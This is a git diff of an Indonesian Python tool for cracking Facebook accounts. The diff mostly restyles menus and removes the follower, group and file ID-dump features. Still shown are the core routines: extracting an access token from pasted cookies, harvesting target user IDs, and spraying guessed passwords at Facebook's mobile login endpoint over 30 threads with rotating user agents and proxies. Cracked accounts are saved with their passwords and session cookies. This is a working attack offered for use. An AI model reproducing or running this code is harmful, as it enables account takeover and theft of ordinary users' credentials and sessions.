-{m}•{k}•{h}•{sir} Author : Ilman Ramdhani Rahman {x}{m}•{k}•{h}•{x}''')
+╭──────────────────────────────────────────────╮
+│                                              │
+│  ██╗██╗     ███╗   ███╗  █████╗  ███╗   ██╗  │
+│  ██║██║     ████╗█████║ ██╔══██╗ ████╗  ██║  │ 
+│  ██║██║     ██╔████ ██║ ███████║ ██╔██╗ ██║  │
+│  ██║██║     ██║ ██╔╝██║ ██╔══██║ ██║╚██ ██║  │
+│  ██║███████╗██║     ██║ ██║  ██║ ██║ ╚████║  │
+│  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═╝  ╚═══╝  │
+╰──────────────────────────────────────────────╯
+{m}•{k}•{h}•{sir} AUTHOR : ILMAN RAMDHANI RAHMAN {x}{m}•{k}•{h}•{x}''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -172,19 +279,19 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
+		cetak(nel('\tSARAN EXTENSION : [green]COOKIEDOUGH[white] 🍪'))
 		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		cookie=input(f'  [{h}•{x}] ├──MASUKKAN COOKIES :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
+		print(f'├── {x}[{h}•{x}]{h} LOGIN BERHASIL JALANKAN ULANG PERINTAHNYA !{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		print(f'├── %s[%sx%s]%s LOGIN GAGAL CEK AKUN TUMBAL KAMU !!%s'%(x,k,x,m,x))
 		exit()
 def bot():
 	try:
@@ -197,61 +304,53 @@ def menu(my_name,my_id):
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print('[×] Cookies Kadaluarsa ')
+		print('╠═[×] COOKIES KADALUARSA ')
 		time.sleep(5)
 		login_lagi334()
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	gh = 'github.com/IlmanRamdhaniR/ILMAN-XD'
-	cetak(nel('\tSelamat Datang [yellow]%s[white] '%(my_name)))
-	print(f'>> Your Idz : '+str(my_id))
-	print(f'>> Your Ip  : {ip}')
-	print(f'>> Github   : {gh}')
-	print('')
-	print('>> 1. Crack Publik ')
-	print('>> 2. Crack Follower ')
-	print('>> 3. Crack Grup   ')
-	print('>> 4. Crack File	')
-	print('>> 5. Hasil Crack  ')
-	print('>> 0. Keluar       ')
-	ilmanramdhanirahman = input('\n>> Pilih : ')
+	gh = 'IlmanRamdhaniR'
+	cetak(nel('\tSELAMAT DATANG [yellow]%s[white] '%(my_name)))
+	cetak(nel('\tID KAMU : [green] '+str(my_id)))
+	print(f'├──[IP KAMU] : {ip}')
+	print(f'├──[GITHUB]  : {gh}')
+	print('│')
+	print('├──[1] CRACK PUBLIC ')
+	print('├──[2] HASIL CRACK  ')
+	print('├──[3] KELUAR       ')
+	ilmanramdhanirahman = input('\n├──[•] PILIH : ')
+	print('│')
 	if ilmanramdhanirahman in ['1']:
 		dump_massal()
 	elif ilmanramdhanirahman in ['2']:
-		dump_follower()
-	elif ilmanramdhanirahman in ['3']:
-		grup()
-	elif ilmanramdhanirahman in ['4']:
-		crack_file()
-	elif ilmanramdhanirahman in ['5']:
 		result()
-	elif ilmanramdhanirahman in ['0']:
+	elif ilmanramdhanirahman in ['3']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print('>> Sukses Logout+Hapus Kukis ')
+		print('├──[•] SUKSES KELUAR COOKIES')
 		exit()
 	else:
-		print('>> Pilih Yang Bener ')
+		print('├──[•] PILIH YANG BENAR ')
 		back()
 def error():
-	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
+	print(f'{k}├──[•] MAAF FITUR INI MASIH DI PERBAIKI {x}')
 	time.sleep(4)
 	back()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	print(f'>> 1. Hasil {h}OK{x} Anda ')
-	print(f'>> 2. Hasil {k}CP{x} Anda ')
-	print('>> 3. Kembali	')
-	kz = input(f'\n>> Pilih : ')
+	print(f'├──[•] 1. HASIL {h}OK{x} ANDA ')
+	print(f'├──[•] 2. HASIL {k}CP{x} ANDA ')
+	print(f'├──[•] 3. KEMBALI	')
+	kz = input(f'\n[•] SELECT : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print('>> File Tidak Di Temukan ')
+			print('├──[FILE TIDAK DITEMUKAN]')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print('>> Anda Tidak Memiliki Hasil CP ')
+			print('├──[ANDA TIDAK MEMILIKI HASIL CP] ')
 			time.sleep(2)
 			back()
 		else:
@@ -265,18 +364,18 @@ def result():
 					nom = ''+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
+					print(f'├── %s. %s ({k} %s {x}ID )'%(nom,isi,len(hem)))
 				else:
 					lol.update({str(cih):str(isi)})
-					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n>> Pilih : ')
+					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' ACCOUNT ]'+x)
+			geeh = input('\n├──[PILIH] : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Yang Bener ')
+				print('├──[PILIH YANG BENAR]')
 				back()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print('>> File Tidak Di Temukan ')
+				print('├──[FILE TIDAK DITEMUKAN]')
 				time.sleep(2)
 				back()
 			nocp=0
@@ -284,17 +383,17 @@ def result():
 				cpkuni=lin[nocp].split('|')
 				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
 				nocp +=1
-			print('')
-			input(f'{x}[{m} Klik Enter{x} ]')
+			print('│')
+			input(f'{x}[{m}├──[KLIK ENTER]{x} ]')
 			back()
 	elif kz in ['1']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print('>> File Tidak Di Temukan ')
+			print('├──[FILE TIDAK DITEMUKAN]')
 			time.sleep(2)
 			back()
 		if len(vin)==0:
-			print('>> Anda Tidak Mempunyai File OK ')
+			print('├──[ANDA TIDAK MEMPUNYAI FILE OK]')
 			time.sleep(2)
 			back()
 		else:
@@ -308,33 +407,33 @@ def result():
 					nom = '0'+str(cih)
 					lol.update({str(cih):str(isi)})
 					lol.update({nom:str(isi)})
-					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
+					print(f'>> %s. %s ( {h}%s{x}├──[ID] )'%(nom,isi,len(hem)))
 				else:
 					lol.update({str(cih):str(isi)})
-					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
-			geeh = input(f'\nPilih : ')
+					print(f'>> %s. %s ({h} %s {x}├──[ID] )'%(cih,isi,(len(hem))))
+			geeh = input(f'\n├──[PILIH] : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Yang Bener ')
+				print('├──[PILIH YANG BENAR]')
 				back()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print('>> File Tidak Di Temukan ')
+				print('')
 				time.sleep(2)
 				back()
 			nocp=0
 			for cpku in range(len(lin)):
 				cpkuni=lin[nocp].split('|')
-				print('')
+				print('├──[FILE TIDAK DITEMUKAN]')
 				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
 				nocp +=1
 			print('')
-			input(f'{x}[{m} Klik Enter{x} ]')
+			input(f'{x}[{m}├──[KLIK ENTER]{x} ]')
 			back()
 	elif kz in ['3']:
 		back()
 	else:
-		print('>> Pilih Yang Bener ')
+		print('├──[PILIH YANG BENAR]')
 		back()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
@@ -344,18 +443,19 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('>> Mau Berapa Target ? : '))
+		jum = int(input('├──[MAU BERAPA TARGET] : '))
 	except ValueError:
-		print('>> Masukkan Angka Jangan Huruf ')
+		print('├──[MASUKKAN ANGKA JANGAN HURUF] ')
 		exit()
 	if jum<1 or jum>100:
-		print('>> Gagal Dump Idz ')
+		print('├──[GAGAL DUMP ID] ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
+		kl = input('├──[MASUKKAN ID YANG KE]' +str(yz)+' : ')
+		print('├')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -369,215 +469,26 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print('>> Tidak Ada Sinyal Loh ')
+			print('├──[TIDAK ADA SINYAL LOH] ')
 			exit()
 	try:
 		print('')
-		print(f'>> Total Idz Yang Terkumpul🔎{h}'+str(len(id)))
+		print(f'├──[TOTAL ID YANG TERKUMPUL] : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print('>> Tidak Ada Sinyal ')
+		print('├──[TIDAK ADA SINYAL] ')
 		back()
 	except (KeyError,IOError):
-		print(f'>>{k} Pertemanan Tidak Publik {x}')
+		print(f'├──{k} [PERTEMANAN TIDAK PUBLIK] {x}')
 		time.sleep(3)
 		back()
-#-------------------[ CRACK-PENGIKUT ]----------------#
-def dump_pengikut():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
-	pil = input('>> Masukkan Idz Target : ')
-	try:
-		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
-		for pi in koh2['subscribers']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
-			except:continue
-		print(f'>> Total Idz :{h} '+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print('>> Koneksi Internet Bermasalah ')
-		exit()
-	except (KeyError,IOError):
-		print('>> Gagal Mengambil Target ')
-		exit()
-#------------------[ CRACK-GRUP ]-----------------#
-balmond = b+"["+h+"✓"+b+"]"
-
-def lah():
-	print(f'\n{x}>> Total Idz Yang Terkumpul :{h} %s '%(len(id)))
-	input(f'{x}>> [ {m}Klik Enter {x}] ')
-	print('')
-	pass
-	setting()
-def grup():
-	print('')
-	id = input(f'{x}>> Masukkan Username Atau Idz Grup : ')
-	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
-	miskinlu = {"user-agent": ua}
-	url = "https://mbasic.facebook.com/groups/"+id
-	ses = requests.Session()
-	try:
-		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
-	except requests.exceptions.ConnectionError:
-		print('>> Tidak Ada Sinyal ')
-		time.sleep(0.5)
-		exit()
-	berr = gn.find("title")
-	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
-	if berr2=='Masuk Facebook':
-		print(" Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
-		time.sleep(0.5)
-		grup()
-	elif berr2=='Kesalahan':
-		alvino_xy('>> Grup Tidak Di Temukan ')
-		time.sleep(0.5)
-		grup()
-	else:pass
-	print(f'{x}>> Nama Grup : {b}%s'%(berr2))
-	ggs = gn.find_all('table')
-	ang = []
-	for ff in ggs:
-		anggo = ff.text
-		bro = anggo.replace('Anggota','')
-		try:
-			mex = int(bro)
-			jumlah = ang.append(mex)
-		except:
-			pass
-	if len(ang)==0:
-		print(" Anggota : -")
-	else:
-		print(f'{x}>> Anggota : {h}%s'%(ang[0]))
-	grup1(url)
-def grup1(urls):
-	use = []
-	ses = requests.Session()
-	print(f'{x}>> Sedang Mengumpulkan Idz ')
-	print(f'>> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
-	while True:
-		try:
-			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
-			miskinlu = {"user-agent": ua}
-			try:
-				url = use[0]
-			except:
-				url = urls
-			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
-			bf2 = set.find_all('a')
-			for g in bf2:
-				css = str(g).split('>')
-				if 'Lihat Postingan Lainnya</span' in css:
-					bcj = str(g).replace('<a href="','').replace('amp;','')
-					bcj2 = bcj.split(' ')[0].replace('"><img','')
-			tes = set.find_all('table')
-			for cari in tes:
-				liatnih = cari.text
-				spl = liatnih.split(' ')
-				if 'mengajukan' in spl:
-					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
-					idyou =	idsiapa[0].replace('content_owner_id_new.','')
-					namayou = liatnih.replace(' mengajukan pertanyaan .','')
-					idku = idyou+'|'+namayou
-					if idku in id:
-						continue
-					else:
-						id.append(idku)
-						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
-				elif '>' in spl:
-					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
-					idyou =	idsiapa[0].replace('content_owner_id_new.','')
-					namayou = liatnih.split(' > ')[0]
-					idku = idyou+'|'+namayou
-					if idku in id:
-						continue
-					else:
-						id.append(idku)
-						xy = random.choice([m,k,h,u,b,x])
-						print(f'\r	———>> {x}({xy} %s {x}) <<———'%(len(id)), end="");sys.stdout.flush()
-				else:
-					continue
-			try:
-				link_ = bcj2
-				use.insert(0,'https://mbasic.facebook.com'+link_)
-			except:
-				girang = set.find('title')
-				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
-				if girang2=='Masuk Facebook':
-					pass
-				else:
-					lah()
-		except requests.exceptions.ConnectionError:
-			try:
-				time.sleep(31)
-			except KeyboardInterrupt:
-				lah()
-		except KeyboardInterrupt:
-			lah()
-#-------------[ CRACK-FROM-FILE ]------------------#
-def crack_file():
-	try:vin = os.listdir('/sdcard/ILMAN-DUMP')
-	except FileNotFoundError:
-		print('>> File Tidak Ditemukan ')
-		time.sleep(2)
-		back()
-	if len(vin)==0:
-		print('')
-		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ILMAN-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
-		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
-		if kontol in ['']:
-			print('>> Pilih Yang Bener ')
-		elif kontol in ['y','Y']:
-			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
-			time.sleep(3)
-			back()
-		elif kontol in ['t','T']:
-			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
-			time.sleep(3)
-			exit()
-		print('>> Anda Tidak Memiliki File Dump ')
-		time.sleep(2)
-		back()
-	else:
-		cih = 0
-		lol = {}
-		for isi in vin:
-			try:hem = open('/sdcard/ILMAN-DUMP/'+isi,'r').readlines()
-			except:continue
-			cih+=1
-			if cih<100:
-				nom = ''+str(cih)
-				lol.update({str(cih):str(isi)})
-				lol.update({nom:str(isi)})
-				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
-			else:
-				lol.update({str(cih):str(isi)})
-				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
-		geeh = input('\n>> Pilih : ')
-		try:geh = lol[geeh]
-		except KeyError:
-			print(f'{k}>> Pilih Yang Bener Kontol {x}')
-			time.sleep(3)
-			back()
-		try:lin = open('/sdcard/ILMAN-DUMP/'+geh,'r').read().splitlines()
-		except:
-			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
-			time.sleep(2)
-			back()
-		for xid in lin:
-			id.append(xid)
-		setting()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	print(f'{x}>> 1. Akun Old ')
-	print('>> 2. Akun New ')
-	print('')
-	hu = input('>> Pilih : ')
+	print(f'{x}├──[1]-[AKUN OLD] ')
+	print('├──[2]-[AKUN NEW] ')
+	print('├')
+	hu = input('├──[PILIH] : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -596,41 +507,41 @@ def setting():
 #			xx = random.randint(0,len(id2))
 #			id2.insert(xx,bacot)
 	else:
-		print('>> Pilih Yang Bener ')
+		print('├──[PILIH YANG BENER]')
 		exit()
-	print('>> 1. Mobile ')
-#	print('>> 2. Mbasic ')
-#	print('>> 3. Touch  ')
-#	print('>> 4. Mtouch ')
-	print('')
-	hc = input('>> Pilih : ')
+	print('├──[1]-[MOBILE] ')
+	print('├──[2]-[MBASIC] ')
+	print('├──[3]-[TOUCH]  ')
+	print('├──[4]-[MTOUCH] ')
+	print('├')
+	hc = input('├──[SELECT] : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
-		print('>> Pilih Yang Bener ')
+		print('├──[PILIH YANG BENAR]')
 		setting()
-#	elif hc in ['2','02']:
-#		method.append('free')
-#	elif hc in ['3','03']:
-#		method.append('touch')
+	elif hc in ['2','02']:
+		method.append('free')
+	elif hc in ['3','03']:
+		method.append('touch')
 	elif hc in ['4','04']:
 		method.append('mbasic')
 	else:
 		method.append('mobile')
-	print('')
-	_jembot_ = input('>> Tambahkan Aplikasi ( Y/t ) ')
+	print('├')
+	_jembot_ = input('├──[TAMBAHKAN APLIKASI] : [Y/T] ')
 	if _jembot_ in ['']:
-		print('>> Pilih Yang Bener ')
+		print('├──[SELECT THATS TRUE]')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+	pwplus=input('├──[TAMBAHKAN PASSWORD MANUAL] : [Y/T] ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
-		pwku=input('>> Masukkan Password Tambahan : ')
+		cetak(nel('[[cyan]•[white]] MASUKKAN KATA SANDI TAMBAHAN\n[[cyan]•[white]] CONTOH :[green] SAYANG,INDONESIA,GANTENG[white] '))
+		pwku=input('├──[MASUKKAN PASSWORD TAMBAHAN] : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -639,11 +550,11 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Memulai Crack Mohon Tunggu Sampai Selesai {m}•{k}•{h}•{x} <<<<< ')
-	print('')
-	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'>> Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
+	print('├──SEDANG MEMULAI CRACK MOHON TUNGGU SAMPAI SELESAI')
+	print('├')
+	print(f'├──[OK]HASIL {h}OK{x} TERSIMPAN DI : {h}OK/%s {x}'%(okc))
+	print(f'├──[CP]HASIL {k}CP{x} TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
+	print(f'├──[PLAY AIRPLANE EVERY {m}500{x} ID\n]')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -679,23 +590,23 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+	cetak(nel('\t[cyan]├──[green] CRACK SUCCESFULLY THANK YOU[cyan] ├──[white] '))
 	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('')
-	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
-	woi = input('>> Pilih : ')
+	print('├──[LANJUT CRACK KEMBALI [Y/T]')
+	woi = input('├──[SELECT] : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
+		print(f'\t{x}[{k} ├──[SEE YOU NEXT TIME]{x}]')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-B-API ]-----------------#
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r🔎 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\r├──{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -712,7 +623,7 @@ def crack(idf,pwv):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
+				print(f'\r{x}├──{k} {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
@@ -724,7 +635,7 @@ def crack(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}{N}')
+					print(f'\r{x}├── {H}{idf}|{pw}|{kuki}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					os.popen('play-audio data/ok.mp3')
 					break
@@ -749,7 +660,7 @@ def crack(idf,pwv):
 					for muncul in apkexp:
 						hit+=1
 						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
-					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
+					print(f'\r{x}├── {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
 					os.popen('play-audio data/ok.mp3')
 					ok+=1
 					break
@@ -1127,9 +1038,9 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	alvino_xy(f'\n\t{x}——> {h}Gunakan Script Ini Sewajarnya\n\t{x}——> {h}Jika Ada Bug/Error Bilang Yahh\n\t{x}——> {h}Ilman Sehat Selalu Yah\n\t{x}——> {h}Semoga Di Mudahkan Rezekinya Amin\n\t{x}——> {h}Semoga Harimu Menyenangkan Sayang{x}')
-	time.sleep(3)
+	ilman(f'\n\t{x}——> {h}ILMAN RAMDHANI RAHMAN :)')
+	time.sleep(2)
 	login()
 
-#>>>>> THANKS TO THIS HERE <<<<<<<#
+#>>>>> THANKS TO THIS HERE <<<<<<
 #>>>>> Ilman Ramdhani Rahman <<<<<#
